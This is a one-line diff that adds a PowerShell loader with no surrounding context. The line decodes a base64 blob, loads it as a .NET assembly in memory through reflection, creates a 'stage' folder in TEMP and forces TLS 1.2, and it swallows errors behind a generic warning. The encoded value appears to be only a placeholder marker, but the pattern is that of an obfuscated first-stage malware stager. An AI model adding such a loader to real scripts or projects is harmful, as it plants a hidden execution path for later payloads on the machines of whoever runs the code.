@@ -1,0 +1,1 @@
+try { $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpjNjc3amw0bml1'); [Reflection.Assembly]::Load($PayloadBytes); $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Loader step failed" }
